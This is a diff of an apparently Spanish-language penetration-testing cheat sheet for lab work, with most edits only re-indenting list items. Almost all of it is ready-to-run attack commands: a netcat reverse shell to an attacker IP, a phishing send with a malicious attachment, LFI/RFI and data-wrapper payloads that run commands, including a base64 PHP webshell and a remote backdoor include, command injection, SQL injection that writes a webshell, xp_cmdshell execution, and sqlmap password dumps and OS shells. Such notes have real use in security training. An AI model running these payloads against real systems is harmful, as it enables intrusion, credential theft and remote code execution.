@@ -4,71 +4,71 @@ Este repositorio contiene comandos rápidos y muchas soluciones imprescindibles 
 Cheats-Sheet:
 https://mqt.gitbook.io → Página Interesante
 
-- sudo mount -t cifs //192.168.x.150/<Resource> /home/kali/<Workspace>/mnt/ -o username=usuario password=password → Montar un recurso SMB en nuestra máquina
+ - sudo mount -t cifs //192.168.x.150/<Resource> /home/kali/<Workspace>/mnt/ -o username=usuario password=password → Montar un recurso SMB en nuestra máquina
 
-- Start-Process -FilePath "C:\Tools\nc.exe" -ArgumentList "-e cmd 192.168.x.151 6000" → Arrancar un binario en powershell
+ - Start-Process -FilePath "C:\Tools\nc.exe" -ArgumentList "-e cmd 192.168.x.151 6000" → Arrancar un binario en powershell 
 
-- MATCH (m:User) RETURN m → Usuarios en BloodHound
+ - MATCH (m:User) RETURN m → Usuarios en BloodHound
 
 Transferencia de ficheros con netcat:
-- nc.exe -lvp 4444 > FiletoTransfer → Cliente
-- nc 192.168.20.X 4444 -w 3 < FiletoTransfer → Servidor
+ - nc.exe -lvp 4444 > FiletoTransfer → Cliente
+ - nc 192.168.20.X 4444 -w 3 < FiletoTransfer → Servidor
 
 XFREERDP Options:
 /w:1920 /h:1080 /fonts /smart-sizing
 
 RDP Activación:
-- reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-- netsh advfirewall firewall add rule name="Regla de Escritorio remoto" dir=in action=allow protocol=TCP localport=3389
-- net start TermService
+ - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+ - netsh advfirewall firewall add rule name="Regla de Escritorio remoto" dir=in action=allow protocol=TCP localport=3389
+ - net start TermService
 
 RDP Desactivación:
-- reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
-- netsh advfirewall firewall delete rule name="Regla de Escritorio remoto"
-- net stop TermService
+ - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+ - netsh advfirewall firewall delete rule name="Regla de Escritorio remoto"
+ - net stop TermService
 
 Cerrar sesiones desde CMD:
-- query user
-- logoff <ID>
+ - query user
+ - logoff <ID>
 
 Wordpress Enumeración:
-- wpscan --url http://192.168.x.150 --enumerate p --plugins-detection aggressive -o websrv1/wpscan → Escaneo con wpscan
+ - wpscan --url http://192.168.x.150 --enumerate p --plugins-detection aggressive -o websrv1/wpscan → Escaneo con wpscan
 
 Git - Enumeración:
-- git status & git log → Enumerar git
-- git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
+ - git status & git log → Enumerar git
+ - git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
 
 Descargar un archivo en powershell:
-- $url = "https://www.ejemplo.com/archivo.zip"  # Cambia la URL a la del archivo que deseas descargar
-- $destino = "C:\ruta\donde\guardar\archivo.zip"  # Cambia la ruta de destino según tus preferencias
-- Invoke-WebRequest -Uri $url -OutFile $destino → Comando Final
+ - $url = "https://www.ejemplo.com/archivo.zip"  # Cambia la URL a la del archivo que deseas descargar
+ - $destino = "C:\ruta\donde\guardar\archivo.zip"  # Cambia la ruta de destino según tus preferencias
+ - Invoke-WebRequest -Uri $url -OutFile $destino → Comando Final
 
 Comandos:
-- sudo swaks -t <final - email> --from <start - email> --attach @config.Library-ms --server 192.168.x.150 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap → Enviar un phishing
+ - sudo swaks -t <final - email> --from <start - email> --attach @config.Library-ms --server 192.168.x.150 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap → Enviar un phishing
 
-- (Import-Clixml -Path user.txt).GetNetworkCredential().password → Desencriptar una credencial en powershell
-- mysql -uuser -p -h host → Conectarse a la base de datos MySQL
-- prompt off → Apagar las consultas de transferencias de archivos por FTP
-- archivo.pcap → Analizar archivo con tshark
+ - (Import-Clixml -Path user.txt).GetNetworkCredential().password → Desencriptar una credencial en powershell
+ - mysql -uuser -p -h host → Conectarse a la base de datos MySQL
+ - prompt off → Apagar las consultas de transferencias de archivos por FTP
+ - archivo.pcap → Analizar archivo con tshark
 
 Enumeración SNMP:
 WEB: https://www.circitor.fr/Mibs/Html/N/NET-SNMP-EXTEND-MIB.php
-- snmpwalk -c public -v1 -t 10 192.168.x.150 → Ver toda la información en SNMP
-- snmpwalk -c public -v1 192.168.x.150 <ID> → Ver información específica en función del SNMP
+ - snmpwalk -c public -v1 -t 10 192.168.x.150 → Ver toda la información en SNMP
+ - snmpwalk -c public -v1 192.168.x.150 <ID> → Ver información específica en función del SNMP
 
 Intoducción a los ataques de aplicaciones web:
 --script=http-enum → Fuzzing con nmap
 
 -d ‘{"password":"fake","username":"admin"}’  -H ‘Content-Type:application/json’ → Enviar una data con curl en formato json
 
-- ssh -i id_rsa -p 2222 user@192.168.x.150 → Conexión ssh con id_rsa
+ - ssh -i id_rsa -p 2222 user@192.168.x.150 → Conexión ssh con id_rsa
 
 Ataques comunes en aplicaciones web:
 Directory Traversal (Windows) - C:\Windows\System32\drivers\etc\hosts → Verificar Path Traversal en windows
 
 C:\inetpub\logs\LogFiles\W3SVC1\ - C:\inetpub\wwwroot\web.config → Rutas relevantes en un IIS
 
-- curl http://192.168.50.16/cgi-bin/../../../../etc/passwd → Vulnerabilidad en Apache 2.4.49
+ - curl http://192.168.50.16/cgi-bin/../../../../etc/passwd → Vulnerabilidad en Apache 2.4.49
 
 *Urlencodear la petición con curl desde la shell*
 *Se debe incluir un & si en la url ya está un ?*
@@ -76,43 +76,43 @@ C:\inetpub\logs\LogFiles\W3SVC1\ - C:\inetpub\wwwroot\web.config → Rutas rele
 Registros de Apache en Windows → C:\xampp\apache\logs 
 Registros de Apache en Linux → /var/log/apache2/access.log
 
-- curl http://192.168.x.150/index.php?page=php://filter/resource=admin.php → Ver el código php en un LFI
-- curl http://192.168.x.150/index.php?page=php://filter/convert.base64-encode/resource=admin.php → Conocer el código php en un LFI usando convert.base64-encode
-- curl "http://192.168.x.150/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>" → Usar el envoltorio data para ejecutar comandos
-- curl "http://192.168.x.150/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" → Usar el envoltorio data cuando la aplicación web está protegida por un WAF
-- curl "http://192.168.x.150/index.php?page=http://192.168..x.151/simple-backdoor.php&cmd=ls" → Explotación del RFI
+ - curl http://192.168.x.150/index.php?page=php://filter/resource=admin.php → Ver el código php en un LFI
+ - curl http://192.168.x.150/index.php?page=php://filter/convert.base64-encode/resource=admin.php → Conocer el código php en un LFI usando convert.base64-encode
+ - curl "http://192.168.x.150/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>" → Usar el envoltorio data para ejecutar comandos
+ - curl "http://192.168.x.150/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" → Usar el envoltorio data cuando la aplicación web está protegida por un WAF
+ - curl "http://192.168.x.150/index.php?page=http://192.168..x.151/simple-backdoor.php&cmd=ls" → Explotación del RFI
 
 .phps, .php7, .pHP → Ejemplo de extensiones de archivos para eludir filtros
 
-- ssh-keygen → Generar una clave pública
-- ssh -p 2222 -i fileup root@192.168.x.150 → Conectarse por ssh con tu clave privada 
+ - ssh-keygen → Generar una clave pública
+ - ssh -p 2222 -i fileup root@192.168.x.150 → Conectarse por ssh con tu clave privada 
 *Eliminar el archivo known_hosts*
 *Intentar sobrescribir archivos modificando su nombre ../../../../../../archivo*
 
-- (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell → Saber dónde se están ejecutando los comandos en windows
+ - (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell → Saber dónde se están ejecutando los comandos en windows
 
-- "&cat /etc/passwd&" → Ejemplo de command Injection 
+ - "&cat /etc/passwd&" → Ejemplo de command Injection 
 
 Ataques de Inyección SQL:
 MYSQL:
-- select * FROM Users WHERE user_name='user' → Ejemplo de consulta MySQL
-- select version(); → Ver la versión de MySQL
-- select system_user(); → Ver el usuario de MySQL
-- show databases; → Muestra las bases de datos
-- SELECT user, authentication_string FROM mysql.user WHERE user = 'user'; → Seleccionar la contraseña hasheada de un usuario
+ - select * FROM Users WHERE user_name='user' → Ejemplo de consulta MySQL
+ - select version(); → Ver la versión de MySQL
+ - select system_user(); → Ver el usuario de MySQL
+ - show databases; → Muestra las bases de datos
+ - SELECT user, authentication_string FROM mysql.user WHERE user = 'user'; → Seleccionar la contraseña hasheada de un usuario
 
 MSSQL:
-- impacket-mssqlclient Administrator:Password@192.168.x.150 -windows-auth → Conectarse a una base de datos MSSQL de forma remota
-- SELECT @@version; → Ver la versión de MSSQL
-- SELECT name FROM sys.databases; → Listar las bases de datos
-- SELECT * FROM user.information_schema.tables; → Ver las tablas de la base de datos
-- select * from offsec.dbo.users; → Ver una tabla específica
+ - impacket-mssqlclient Administrator:Password@192.168.x.150 -windows-auth → Conectarse a una base de datos MSSQL de forma remota
+ - SELECT @@version; → Ver la versión de MSSQL
+ - SELECT name FROM sys.databases; → Listar las bases de datos
+ - SELECT * FROM user.information_schema.tables; → Ver las tablas de la base de datos
+ - select * from offsec.dbo.users; → Ver una tabla específica
 Remote Command Execution:
-- EXECUTE sp_configure 'show advanced options', 1;
-- RECONFIGURE;
-- EXECUTE sp_configure ‘xp_cmdshell’ , 1;
-- RECONFIGURE;
-- EXECUTE xp_cmdshell 'command';
+ - EXECUTE sp_configure 'show advanced options', 1;
+ - RECONFIGURE;
+ - EXECUTE sp_configure ‘xp_cmdshell’ , 1;
+ - RECONFIGURE;
+ - EXECUTE xp_cmdshell 'command';
 
 SQLi:
 user' OR 1=1 -- // → SQLi básico
@@ -127,14 +127,14 @@ http://192.168.x.150/blindsqli.php?user=user' AND IF (1=1, sleep(3), 'false') --
 ‘ UNION SELECT "<?php system($_GET ['cmd']);?>”, null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // → Ejecutar comandos a través de un SQLi
 
 SQLMAP:
-- sqlmap -u http://192.168.x.150/blindsqli.php?user=1 -p user
-- sqlmap -r request.txt 
-- sqlmap --ignore-redirects -r request.txt --technique B -p username --current-user
-- sqlmap --ignore-redirects -r request.txt --batch --technique B -p username -U <username> --passwords
-- sqlmap --ignore-redirects -r request.txt -p <parámetro>  --os-shell  --web-root "<Ruta de la Aplicación Web>"
-- sqlmap --ignore-redirects -r requests.txt -batch -dbs -v 3
-- sqlmap --ignore-redirects -r requests.txt -batch --dump -D <database> 
-- sqlmap --ignore-redirects -r requests.txt -batch --dump -T <table> -D <database> 
+ - sqlmap -u http://192.168.x.150/blindsqli.php?user=1 -p user
+ - sqlmap -r request.txt 
+ - sqlmap --ignore-redirects -r request.txt --technique B -p username --current-user
+ - sqlmap --ignore-redirects -r request.txt --batch --technique B -p username -U <username> --passwords
+ - sqlmap --ignore-redirects -r request.txt -p <parámetro>  --os-shell  --web-root "<Ruta de la Aplicación Web>"
+ - sqlmap --ignore-redirects -r requests.txt -batch -dbs -v 3
+ - sqlmap --ignore-redirects -r requests.txt -batch --dump -D <database> 
+ - sqlmap --ignore-redirects -r requests.txt -batch --dump -T <table> -D <database> 
 
 Ataques del lado del cliente:
 - exiftool -a -u archivo.pdf → Extraxión de metadatos con exiftool
